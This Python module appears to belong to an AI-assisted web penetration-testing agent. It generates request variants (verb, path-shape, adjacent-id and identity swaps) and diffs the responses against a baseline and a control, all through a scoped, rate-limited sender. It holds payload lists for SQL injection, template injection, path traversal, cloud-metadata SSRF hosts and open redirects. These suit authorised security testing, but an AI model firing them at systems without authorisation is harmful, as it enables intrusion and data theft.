"""gnoc_probe.py - the probe matrix: one request turned into a controlled set of variants, answered as a diff.

A small model is bad at grinding twenty careful variants by hand and good at reading a short table. So the
variants and the comparison are code; the model only reads what differs. Every variant still goes out through
gnoc_agent's gated sender (scope + policy + rate + raw capture) and is counted against the hypothesis.

Variants (capped, deduplicated):
  baseline        the request as given
  control         a nonsense sibling path: tells a real answer from a catch-all / soft-200
  identity arms   the baseline under each identity given (none, junk bearer, account A, account B ...)
  methods         the same URL under other HTTP verbs (write verbs only when allow_writes)
  path shapes     trailing slash, case, encoded last character, dot segment, double slash, API version twins
  object ids      the last numeric id +/- 1 and 1; a UUID swapped for the nil UUID
Reading the table: '=ctl' means the response matches the nonsense control (probably a catch-all, not a hit);
'!' marks an anomaly worth a crafted follow-up: a 2xx where the baseline was refused, a new JSON key, or a
status/length that departs from both the baseline and the control.
"""
import hashlib
import json
import re
import secrets
import urllib.parse

READ_METHODS = ("GET", "HEAD", "OPTIONS")
WRITE_METHODS = ("POST", "PUT", "PATCH", "DELETE")
MAX_VARIANTS = 24


def _with_path(u, path):
    return urllib.parse.urlunsplit(u._replace(path=path))


def variants(url, method="GET", identities=None, allow_writes=False, mutate=("methods", "path", "id", "identity")):
    """[(label, method, url, extra_headers)] baseline first, control second."""
    method = (method or "GET").upper()
    # a write baseline (DELETE / PUT / POST with a body) is only ever sent to the URL GreyNOC named: the path and
    # id arms would replay it against id-1, id+1 and id 1, i.e. other users' objects, unless writes were allowed
    if method not in READ_METHODS and not allow_writes:
        mutate = tuple(m for m in mutate if m not in ("path", "id"))
    u = urllib.parse.urlsplit(url)
    path = u.path or "/"
    segs = path.split("/")
    out = [("baseline", method, url, {}),
           ("control:nonsense", method, _with_path(u, path.rstrip("/") + "/gnoc" + secrets.token_hex(3)), {})]
    if "identity" in mutate:
        for name, hdrs in (identities or {}).items():
            out.append((f"as:{name}", method, url, dict(hdrs or {})))
    if "methods" in mutate:
        for m in READ_METHODS + (WRITE_METHODS if allow_writes else ()):
            if m != method:
                out.append((f"method:{m}", m, url, {}))
    if "path" in mutate and path != "/":
        last = segs[-1] or (segs[-2] if len(segs) > 1 else "")
        shapes = [("path:slash", path[:-1] if path.endswith("/") else path + "/"),
                  ("path:double-slash", path.replace("/", "//", 1)),
                  ("path:dot-segment", "/".join(segs[:-1]) + "/./" + segs[-1] if segs[-1] else path + "./")]
        if last and last.lower() != last.upper():
            shapes.append(("path:case", path[: len(path) - len(last)] + last.upper() if path.endswith(last)
                           else path.upper()))
        if last:
            enc = last[:-1] + "%{:02X}".format(ord(last[-1]))
            shapes.append(("path:encoded-last-char", path[: path.rfind(last)] + enc + path[path.rfind(last) + len(last):]))
        m = re.search(r"/v(\d+)(/|$)", path)
        if m:
            n = int(m.group(1))
            for k in (n - 1, n + 1):
                if k >= 1:
                    shapes.append((f"path:version-v{k}", path[:m.start()] + f"/v{k}" + path[m.end() - len(m.group(2)):]))
        for label, p in shapes:
            out.append((label, method, _with_path(u, p), {}))
    if "id" in mutate:
        nums = list(re.finditer(r"/(\d{1,12})(?=/|$)", path))
        if nums:
            m = nums[-1]
            n = int(m.group(1))
            for k in sorted({n - 1, n + 1, 1} - {n}):
                if k >= 0:
                    out.append((f"id:{k}", method, _with_path(u, path[:m.start(1)] + str(k) + path[m.end(1):]), {}))
        uu = re.search(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", path, re.I)
        if uu:
            out.append(("id:nil-uuid", method, _with_path(u, path.replace(uu.group(0), "00000000-0000-0000-0000-000000000000")), {}))
    seen, uniq = set(), []
    for v in out:
        key = (v[1], v[2], json.dumps(v[3], sort_keys=True))
        if key not in seen:
            seen.add(key)
            uniq.append(v)
    return uniq[:MAX_VARIANTS]


def fingerprint(resp):
    """Compact, comparable view of one response."""
    body = resp.get("body") or ""
    if not isinstance(body, str):
        body = str(body)
    hdrs = {str(k).lower(): v for k, v in (resp.get("headers") or {}).items()}
    keys = []
    try:
        j = json.loads(body)
        if isinstance(j, dict):
            keys = sorted(j)[:30]
        elif isinstance(j, list) and j and isinstance(j[0], dict):
            keys = ["[]"] + sorted(j[0])[:29]
    except ValueError:
        pass
    return {"status": resp.get("status"), "len": len(body), "ctype": str(hdrs.get("content-type", ""))[:40],
            "hash": hashlib.sha1(body.encode("utf-8", "replace")).hexdigest()[:8], "keys": keys,
            "location": str(hdrs.get("location", ""))[:80]}


def _ok(st):
    return isinstance(st, int) and 200 <= st < 300


def summarize(rows):
    """rows: [(label, method, url, fp_or_error_str, raw_path)] -> (table text, anomaly count)."""
    fps = {r[0]: r[3] for r in rows if isinstance(r[3], dict)}
    base, ctl = fps.get("baseline"), fps.get("control:nonsense")
    lines, n_anom = [], 0
    for label, method, url, fp, raw in rows:
        if not isinstance(fp, dict):
            lines.append((1, f"  {label:<26} {method:<7} ERROR {str(fp)[:80]}"))
            continue
        flags = []
        if ctl and label != "control:nonsense" and fp["status"] == ctl["status"] and (
                fp["hash"] == ctl["hash"] or abs(fp["len"] - ctl["len"]) <= 16):
            flags.append("=ctl")
        if base and label not in ("baseline", "control:nonsense"):
            if _ok(fp["status"]) and not _ok(base["status"]) and "=ctl" not in flags:
                flags.append("! 2xx where baseline refused")
            new_keys = sorted(set(fp["keys"]) - set(base["keys"]))
            if new_keys and "=ctl" not in flags:
                flags.append("! new keys " + ",".join(new_keys[:6]))
            if (fp["status"] != base["status"] or abs(fp["len"] - base["len"]) > 32) and "=ctl" not in flags \
                    and not any(f.startswith("!") for f in flags) and _ok(fp["status"]):
                flags.append("! differs from baseline and control")
        anom = any(f.startswith("!") for f in flags)
        n_anom += anom
        line = (f"  {label:<26} {method:<7} {fp['status']!s:<4} len={fp['len']:<7} {fp['ctype']:<24} {fp['hash']}"
                + (f" keys={','.join(fp['keys'][:5])}" if fp["keys"] else "")
                + (f" -> {fp['location']}" if fp["location"] else "")
                + (f"   {' '.join(flags)}" if flags else "") + (f"\n      raw={raw}" if anom else ""))
        lines.append((0 if anom else 2 if label in ("baseline", "control:nonsense") else 3, line))
    lines.sort(key=lambda x: x[0])
    # UNFIRED is not a negative (T-40). A row whose fingerprint is an error string never reached the wire, so
    # counting it as a sent variant turns a gate, a rate limit or a DNS failure into "0 anomalies" - a refusal
    # that reads like a clean result. Say how many never went, and withhold the summary when none did.
    errs = [str(r[3]) for r in rows if not isinstance(r[3], dict)]
    n_err = len(errs)
    n_sent = len(rows) - n_err
    reasons = ", ".join(dict.fromkeys(e.split(":")[0] for e in errs))[:120]
    if rows and n_sent == 0:
        head = (f"NOTHING WAS SENT: all {n_err} variant(s) failed before the wire ({reasons}). That is UNFIRED, "
                "not a negative - fix the cause and re-run before concluding anything about this surface.")
        return head + "\n" + "\n".join(l for _, l in lines), n_anom
    head = (f"{n_sent} variants sent, {n_anom} anomal{'y' if n_anom == 1 else 'ies'}"
            + (f", {n_err} UNFIRED (never reached the wire: {reasons}) - those are not negatives" if n_err else "")
            + " (! = follow up with a crafted "
            "request; =ctl = matches the nonsense control, likely a catch-all). Path-shape rows were sent by an HTTP "
            "client that may normalise paths: confirm a path-shape hit with curl --path-as-is before claiming it.")
    return head + "\n" + "\n".join(l for _, l in lines), n_anom


# ---------------------------------------------------------------- sweep by code (XBOW gap 10)  # ORACLE
# One call fills {{X}} markers in the url / body / headers from a named payload set and sends every variant
# through the SAME gated sender (scope, policy, rate, raw capture). The answer is the summarize() diff table.

SETS = {
    "encodings": ["%2e", "%252e", "%2f", "%252f", "%5c", "%00", "%0a", "%0d%0a", "%20", "%09", "..%2f", "%c0%ae",
                  "%e2%80%8b", "%u002e", "&#46;", ".%00", "%3b", "%23", "%3f", "%ff"],
    "path-shapes": ["/", "//", "/./", "/../", "/.;/", ";/", "/;x/", "/%2e/", "/%2e%2e/", "/x/../", "/./.", "/~",
                    "/.%2e/", "/%20/", "/%09/", "\\", "/..;/", "/.json", "/.css", "/?"],
    "id-forms": ["1", "0", "-1", "01", "1.0", "1e0", "0x1", "%31", "[1]", "1,2", "1%00", "null", "true", "*",
                 "00000000-0000-0000-0000-000000000000", "1 ", "+1", "9999999999", "\"1\"", "{\"id\":1}"],
    "header-hosts": ["localhost", "127.0.0.1", "[::1]", "0", "2130706433", "0x7f000001", "169.254.169.254",
                     "metadata.google.internal", "internal", "admin", "{host}:80", "{host}.", "{host}@localhost",
                     "localhost:{port}"],
    "bool-sqli": ["' AND '1'='1", "' AND '1'='2", " AND 1=1", " AND 1=2", "\" AND \"1\"=\"1", "\" AND \"1\"=\"2",
                  "') AND ('1'='1", "') AND ('1'='2", " AND 1=1-- -", " AND 1=2-- -", "' OR 'a'='a", "' OR 'a'='b"],
    "ssti-markers": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}", "${{7*7}}", "@(7*7)", "{7*7}",
                     "[[${7*7}]]", "{{=7*7}}", "*{7*7}", "$${7*7}"],
    "redirect-hosts": ["https://gnoc-redirect.example", "//gnoc-redirect.example", "/\\gnoc-redirect.example",
                       "https:gnoc-redirect.example", "https://{host}@gnoc-redirect.example",
                       "https://gnoc-redirect.example%2f{host}", "https://{host}.gnoc-redirect.example",
                       "\\\\gnoc-redirect.example", "https://gnoc-redirect.example?{host}", "javascript://%0a"],
}
NEUTRAL = {"path-shapes": "/", "id-forms": "1", "header-hosts": "{host}", "redirect-hosts": "/"}
MARKER = re.compile(r"\{\{([A-Za-z_][A-Za-z0-9_-]*)\}\}")
SWEEP_CAP = 40


def _fill(s, vals):
    if not isinstance(s, str):
        return s
    return MARKER.sub(lambda m: vals.get(m.group(1), m.group(0)), s)


def sweep_variants(url, method="GET", slots=None, payload_set=None, cap=SWEEP_CAP, headers=None, body=None):
    """[(label, method, url, headers, body)]: baseline (neutral fill), control (nonsense fill), then up to cap
    payload variants. slots: None (every marker from payload_set) | [marker, ...] | {marker: set name | [values]}."""
    import itertools
    headers = dict(headers or {})
    texts = [url, body if isinstance(body, str) else ""] + [str(k) + str(v) for k, v in headers.items()]
    found = list(dict.fromkeys(m for t in texts for m in MARKER.findall(t or "")))
    if not found:
        raise ValueError("no {{X}} marker in url, body or headers")
    if isinstance(slots, str):
        slots = [x.strip() for x in slots.split(",") if x.strip()]
    if slots is None or isinstance(slots, list):
        slots = {m: payload_set or "encodings" for m in (slots or found)}
    if not isinstance(slots, dict):
        raise ValueError("slots must be a list of marker names or {marker: set name | [values]}")
    u = urllib.parse.urlsplit(MARKER.sub("x", url))
    host, port = u.hostname or "", str(u.port or (443 if u.scheme == "https" else 80))
    pools, neutral = {}, {}
    for m in found:
        src = slots.get(m, payload_set or "encodings")
        if isinstance(src, str):
            if src not in SETS:
                raise ValueError(f"unknown payload set {src!r}; one of: {', '.join(SETS)}")
            vals, neu = SETS[src], NEUTRAL.get(src, "")
        else:
            vals, neu = [str(v) for v in src], ""
        pools[m] = [v.replace("{host}", host).replace("{port}", port) for v in vals]
        neutral[m] = neu.replace("{host}", host).replace("{port}", port)
    cap = max(1, min(int(cap or SWEEP_CAP), SWEEP_CAP))
    method = (method or "GET").upper()

    def one(label, vals):
        return (label, method, _fill(url, vals), {_fill(k, vals): _fill(v, vals) for k, v in headers.items()},
                _fill(body, vals))
    nonsense = "gnoc" + secrets.token_hex(3)
    out = [one("baseline", neutral), one("control:nonsense", {m: nonsense for m in found})]
    seen = {json.dumps(v[1:], sort_keys=True, default=str) for v in out}
    for combo in itertools.product(*[pools[m] for m in found]):
        if len(out) - 2 >= cap:
            break
        vals = dict(zip(found, combo))
        v = one(" ".join(f"{m}={vals[m][:18]}" for m in found), vals)
        key = json.dumps(v[1:], sort_keys=True, default=str)
        if key not in seen:
            seen.add(key)
            out.append(v)
    return out


def sweep(url, method="GET", slots=None, payload_set=None, cap=SWEEP_CAP, send=None, headers=None, body=None):
    """(table, anomaly count, rows). send(label, method, url, headers, body) -> (response dict, raw path) is the
    caller's gated sender; an exception from it is recorded as that row's error, never raised."""
    if send is None:
        raise ValueError("sweep needs the gated sender")
    rows = []
    for label, m, u, h, b in sweep_variants(url, method, slots, payload_set, cap, headers, body):
        try:
            r, rp = send(label, m, u, h, b if m not in READ_METHODS else None)
        except Exception as e:  # noqa: BLE001 - one refused / failed variant is a row, not the end of the sweep
            rows.append((label, m, u, f"{type(e).__name__}: {e}", None))
            continue
        rows.append((label, m, u, fingerprint(r), rp))
    table, n = summarize(rows)
    return table, n, rows
